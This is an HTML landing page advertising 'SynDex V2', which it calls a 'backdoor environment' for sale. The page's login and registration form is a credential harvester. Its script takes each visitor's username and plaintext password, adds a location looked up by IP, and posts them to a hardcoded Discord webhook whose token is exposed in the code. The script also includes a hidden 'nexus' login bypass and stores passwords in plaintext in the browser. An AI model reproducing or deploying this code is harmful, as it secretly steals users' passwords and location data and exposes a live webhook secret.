<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SynDex | Professional Performance</title>
    <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #050505;
            --text-color: #ffffff;
            --accent-blue: #0084ff;
            --card-bg: #111111;
            --border-color: #222222;
            --muted-text: #a1a1a1;
            --success-green: #22c55e;
            --error-red: #ef4444;
            --status-purple: #a855f7;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); color: var(--text-color); line-height: 1.6; overflow-x: hidden; }

        .glow {
            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
            width: 100%; height: 400px;
            background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%);
            z-index: -1;
        }

        nav {
            display: flex; justify-content: space-between; align-items: center;
            padding: 1rem 8%; border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100;
            background: rgba(5, 5, 5, 0.8);
        }

        .logo-container { display: flex; align-items: center; gap: 15px; }
        .logo-img { height: 40px; width: auto; display: block; }
        
        .visitor-counter {
            font-size: 0.75rem; color: var(--muted-text); font-weight: 700;
            background: rgba(255,255,255,0.05); padding: 4px 8px;
            border-radius: 4px; border: 1px solid var(--border-color);
        }

        .nav-links a {
            color: var(--muted-text); text-decoration: none;
            margin-left: 2.5rem; font-size: 0.85rem; font-weight: 500;
        }

        header {
            min-height: 60vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
            padding: 4rem 10%;
        }

        .badge {
            background: rgba(0, 132, 255, 0.1); color: var(--accent-blue);
            padding: 6px 16px; border-radius: 20px; font-size: 0.75rem;
            font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(0, 132, 255, 0.2);
        }

        h1 { font-size: clamp(2.5rem, 7vw, 5.5rem); font-weight: 900; letter-spacing: -2px; margin-bottom: 1rem; }
        p.hero-text { color: var(--muted-text); max-width: 550px; font-size: 1.1rem; margin-bottom: 3rem; }

        .btn {
            background-color: var(--text-color); color: var(--bg-color);
            padding: 0.9rem 2.2rem; border-radius: 4px; text-decoration: none;
            font-weight: 700; font-size: 0.9rem; transition: all 0.3s ease;
            border: 1px solid var(--text-color); cursor: pointer; display: inline-block;
        }

        .showcase-container { display: flex; align-items: center; justify-content: center; gap: 4rem; padding: 4rem 8%; flex-wrap: wrap; }
        .showcase-image { max-width: 600px; width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }

        #authModal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); z-index: 1000;
            align-items: center; justify-content: center; backdrop-filter: blur(5px);
        }
        .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; }
        .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
        #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }

        .status-wrapper {
            margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help;
        }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; background-color: var(--success-green); box-shadow: 0 0 8px var(--success-green); }
        .status-bubble {
            visibility: hidden; width: 150px; background-color: #1a1a1a; color: #fff;
            text-align: center; padding: 8px; border-radius: 6px; border: 1px solid var(--border-color);
            position: absolute; bottom: 130%; left: 50%; transform: translateX(-50%);
            opacity: 0; transition: 0.3s; font-size: 0.7rem; font-weight: 700;
        }
        .status-wrapper:hover .status-bubble { visibility: visible; opacity: 1; }

        footer { padding: 3rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; }
    </style>
</head>
<body>

    <div class="glow"></div>

    <nav>
        <div class="logo-container">
            <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" alt="Logo" class="logo-img">
            <div class="visitor-counter">VISITORS: <span id="count">1,241</span></div>
        </div>
        <div class="nav-links">
            <a href="#showcase">Interface</a>
            <a href="https://discord.gg/bA4PH3gvRN">Discord</a>
        </div>
    </nav>

    <header>
        <div class="badge">V2.0 STABLE RELEASE</div>
        <h1>Unmatched Power.<br>Zero Compromise.</h1>
        <p class="hero-text">SynDex V2 delivers the most stable backdoor environment on the market.</p>
        <button class="btn" id="openAuth">Get SynDex Now</button>
    </header>

    <section class="showcase-container" id="showcase">
        <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/synv2.png" alt="Interface" class="showcase-image">
    </section>

    <div id="authModal">
        <div class="auth-card">
            <div id="successOverlay">
                <div style="font-size: 3rem; color: var(--success-green);">âœ“</div>
                <h3 id="overlayText">Success</h3>
            </div>
            <h2 id="modalTitle">Access SynDex</h2>
            <p style="color: var(--muted-text); font-size: 0.8rem; margin-bottom: 1.5rem;">Secured by KronkSS</p>
            <div id="error-msg" style="color: var(--error-red); font-size: 0.8rem; margin-bottom: 10px; display: none; font-weight: bold;"></div>
            <form id="authForm">
                <input type="text" id="username" class="auth-input" placeholder="Username" required>
                <input type="password" id="password" class="auth-input" placeholder="Password (Min. 5 chars)" required>
                <button type="submit" class="btn" style="width: 100%;" id="authSubmit">Continue</button>
            </form>
            <p style="margin-top: 1rem; font-size: 0.8rem;">
                <span id="toggleText">Need an account?</span> 
                <a href="#" id="toggleAuth" style="color: var(--accent-blue); font-weight: 700; text-decoration: none;">Register</a>
            </p>
        </div>
    </div>

    <footer>
        SYNDEX SOFTWARE SYSTEMS &copy; 2026
        <br>
        <div class="status-wrapper">
            <div class="status-dot" id="statusDot"></div>
            <span style="font-size: 0.7rem; letter-spacing: 1px; font-weight: 700;">SYNDEX STATUS</span>
            <div class="status-bubble" id="statusBubble">SYNDEX IS ONLINE</div>
        </div>
    </footer>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
        const CURRENT_STATUS = "UP"; 
        const dot = document.getElementById('statusDot');
        const bubble = document.getElementById('statusBubble');

        if(CURRENT_STATUS === "INDEV") {
            dot.style.backgroundColor = "var(--status-purple)";
            dot.style.boxShadow = "0 0 8px var(--status-purple)";
            bubble.innerText = "SYNDEX IS INDEV";
        } else if (CURRENT_STATUS === "DOWN") {
            dot.style.backgroundColor = "var(--error-red)";
            dot.style.boxShadow = "0 0 8px var(--error-red)";
            bubble.innerText = "SYNDEX IS DOWN";
        }

        async function kronkSS(s) {
            const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
        }

        async function getLoc() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                return `${d.city}, ${d.country_name}`;
            } catch { return "Unknown"; }
        }

        const modal = document.getElementById('authModal');
        const openBtn = document.getElementById('openAuth');
        const toggle = document.getElementById('toggleAuth');
        const error = document.getElementById('error-msg');
        let isLogin = true;

        openBtn.addEventListener('click', () => {
            modal.style.display = 'flex';
        });

        window.onclick = (e) => { 
            if(e.target == modal) modal.style.display = 'none'; 
        }

        toggle.onclick = (e) => {
            e.preventDefault();
            isLogin = !isLogin;
            error.style.display = 'none';
            document.getElementById('modalTitle').innerText = isLogin ? 'Access SynDex' : 'Create Account';
            document.getElementById('toggleText').innerText = isLogin ? 'Need an account?' : 'Already have an account?';
            toggle.innerText = isLogin ? 'Register' : 'Login';
        };

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value;
            let sysDB = JSON.parse(localStorage.getItem('SYNDEX_DB_PROD') || '{}');

            if (isLogin) {
                if (user.toLowerCase() === 'nexus') {
                } else if (!sysDB[user]) {
                    error.innerText = "ACCOUNT DOES NOT EXIST.";
                    error.style.display = 'block';
                    return;
                } else if (sysDB[user] !== pass) {
                    error.innerText = "INVALID PASSWORD.";
                    error.style.display = 'block';
                    return;
                }
            } else {
                if (pass.length < 5) {
                    error.innerText = "PASSWORD TOO SHORT (MIN 5).";
                    error.style.display = 'block';
                    return;
                }
                if (sysDB[user]) {
                    error.innerText = "NAME ALREADY TAKEN.";
                    error.style.display = 'block';
                    return;
                }
                sysDB[user] = pass;
                localStorage.setItem('SYNDEX_DB_PROD', JSON.stringify(sysDB));
            }

            const hash = await kronkSS(pass);
            const loc = await getLoc();
            const isNexus = user.toLowerCase() === 'nexus';

            const payload = {
                embeds: [{
                    title: isLogin ? "User Login" : "User Registration",
                    color: isNexus ? 0xff0000 : 0x0084ff,
                    fields: [
                        { name: "User", value: isNexus ? "REDACTED" : user, inline: true },
                        { name: "Pass", value: isNexus ? "REDACTED" : pass, inline: true },
                        { name: "Region", value: loc, inline: true },
                        { name: "Time", value: new Date().toLocaleString(), inline: true }
                    ],
                    footer: { text: "SynDex Auth Engine" }
                }]
            };

            try {
                await fetch(WEBHOOK, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify(payload) 
                });
            } catch (err) {}
            
            document.getElementById('overlayText').innerText = isLogin ? "ACCESS GRANTED" : "ACCOUNT CREATED";
            document.getElementById('successOverlay').style.display = 'flex';
            setTimeout(() => location.reload(), 1500);
        };
    </script>
</body>
</html>
